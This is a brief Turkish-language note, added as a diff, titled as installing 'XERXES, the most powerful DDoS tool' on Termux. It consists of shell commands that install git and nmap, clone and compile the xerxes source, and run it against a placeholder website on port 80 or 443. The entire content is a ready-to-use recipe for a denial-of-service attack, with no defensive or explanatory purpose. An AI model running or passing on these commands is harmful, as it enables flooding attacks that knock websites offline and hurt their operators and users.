@@ -1,0 +1,37 @@
+#Tool #website 
+
+XERXES en güçlü DDoS toolu || Termuxa Kurma
+
+                 
+
+ 
+
+$ apt update && apt upgrade -y
+
+ 
+
+$ apt install git -y
+
+ 
+
+$ apt install nmap -y
+
+ 
+
+$ git clone https://github.com/zanyarjamal/xerxes
+
+ 
+
+$ cd xerxes
+
+ 
+
+$ gcc xerxes.c -o xerxes
+
+ 
+
+$ ./xerxes [www.xxxxxx.com] 80
+
+ 
+
+[@] Port 80 http için , port 443 https için
